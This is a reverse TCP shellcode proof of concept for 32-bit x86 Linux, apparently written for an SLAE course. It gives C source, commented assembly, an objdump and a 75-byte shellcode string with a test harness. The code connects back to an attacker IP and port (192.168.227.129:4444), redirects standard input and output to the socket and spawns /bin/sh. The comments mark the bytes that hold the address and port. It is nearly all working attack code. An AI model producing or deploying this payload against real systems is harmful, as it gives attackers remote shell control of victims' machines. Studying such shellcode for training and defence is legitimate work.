/*
# Linux x86 TCP Reverse Shellcode (75 bytes)
# Author: sajith
# Tested on: i686 GNU/Linux
# Shellcode Length: 75
# SLAE - 750

------------c prog ---poc by sajith shetty----------

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)

{

int sock_file_des;
struct sockaddr_in sock_ad;
//[1] create socket connection
//Man page: socket(int domain, int type, int protocol);
sock_file_des = socket(AF_INET, SOCK_STREAM, 0);


//[2]connect back to attacker machine (ip= 192.168.227.129)
//Man page: int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);

sock_ad.sin_family = AF_INET;
sock_ad.sin_port = htons(4444);
sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
//[3]Redirect file descriptors (STDIN, STDOUT and STDERR) to the socket using DUP2
//Man page: int dup2(int oldfd, int newfd);

dup2(sock_file_des, 0); // stdin
dup2(sock_file_des, 1); // stdout
dup2(sock_file_des, 2); // stderr

//[4]Execute shell (here we use /bin/sh) using execve call

//[*]Man page for execve call
//int execve(const char *filename, char *const argv[],char *const envp[]);

execve("/bin/sh", 0, 0);
}
----------------------end of c program--------------

global _start

section .text

_start:
    ;[1] create socket connection
;Man page: socket(int domain, int type, int protocol);
;sock_file_des = socket(2,1,0)

    xor edx, edx
    push 0x66           ; socket call(0x66)
    pop eax
    push edx            ; protocol = 0
    inc edx
    push edx            ; sock_stream = 1
    mov ebx, edx        ; EBX =1
    inc edx
    push edx            ; AF_INET =2
    mov ecx, esp        ; save the pointer to args in ecx register
    int 0x80            ; call socketcall()

    ; int dup2(int oldfd, int newfd);
    mov ebx, eax       ; store sock_file_des in ebx register
    mov ecx, edx        ; counter = 2
    loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop
; sock_ad.sin_family = AF_INET;
;sock_ad.sin_port = htons(4444);
;sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
;connect(sock_file_des,(struct sockaddr *) &sock_ad,sizeof(sock_ad));
xchg ebx, edx       ; before xchg edx=2 and ebx=sock_file_des and after xchg ebx=2, edx=sock_file_des
    push 0x81e3a8c0     ; sock_ad.sin_addr.s_addr = inet_addr("192.168.227.129");
    push word 0x5C11    ; sock_ad.sin_port = htons(4444);
    push word bx        ; sock_ad.sin_family = AF_INET =2;
    mov ecx, esp        ; pointer to struct

    mov al, 0x66        ; socket call (0x66)
    inc ebx             ; connect (3)
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push edx            ; sock_file_des
    mov ecx, esp        ; save the pointer to args in ecx register
    int 0x80

    mov   al, 11            ; execve system call
    cdq ; overwriting edx with either 0 (if eax is positive)
    push  edx               ; push null
    push  0x68732f6e        ; hs/b
    push  0x69622f2f        ; ib//
    mov   ebx,esp           ; save pointer
    push  edx               ; push null
    push  ebx               ; push pointer
    mov   ecx,esp           ; save pointer
    int   0x80

-------------obj dump------------
rev_shell1:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 d2                 xor    edx,edx
 8048062: 6a 66                 push   0x66
 8048064: 58                   pop    eax
 8048065: 52                   push   edx
 8048066: 42                   inc    edx
 8048067: 52                   push   edx
 8048068: 89 d3                 mov    ebx,edx
 804806a: 42                   inc    edx
 804806b: 52                   push   edx
 804806c: 89 e1                 mov    ecx,esp
 804806e: cd 80                 int    0x80
 8048070: 89 c3                 mov    ebx,eax
 8048072: 89 d1                 mov    ecx,edx

08048074 <loop>:
 8048074: b0 3f                 mov    al,0x3f
 8048076: cd 80                 int    0x80
 8048078: 49                   dec    ecx
 8048079: 79 f9                 jns    8048074 <loop>
 804807b: 87 da                 xchg   edx,ebx
 804807d: 68 c0 a8 e3 81       push   0x81e3a8c0
 8048082: 66 68 11 5c           pushw  0x5c11
 8048086: 66 53                 push   bx
 8048088: 89 e1                 mov    ecx,esp
 804808a: b0 66                 mov    al,0x66
 804808c: 43                   inc    ebx
 804808d: 6a 10                 push   0x10
 804808f: 51                   push   ecx
 8048090: 52                   push   edx
 8048091: 89 e1                 mov    ecx,esp
 8048093: cd 80                 int    0x80
 8048095: b0 0b                 mov    al,0xb
 8048097: 99                   cdq
 8048098: 52                   push   edx
 8048099: 68 6e 2f 73 68       push   0x68732f6e
 804809e: 68 2f 2f 62 69       push   0x69622f2f
 80480a3: 89 e3                 mov    ebx,esp
 80480a5: 52                   push   edx
 80480a6: 53                   push   ebx
 80480a7: 89 e1                 mov    ecx,esp
 80480a9: cd 80                 int    0x80

-----------------------------------------------
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xd2\x6a\x66\x58\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x89\xc3\x89\xd1\xb0\x3f\xcd\x80\x49\x79\xf9\x87\xda\x68"
"\xc0\xa8\xe3\x81" //IP address 192.168.227.129
"\x66\x68"
"\x11\x5c" // port 4444
"\x66\x53\x89\xe1\xb0\x66\x43\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x0b\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80";


main()
{
  printf("Shellcode Length:  %d\n", strlen(code));
int (*ret)() = (int(*)())code;
ret();
}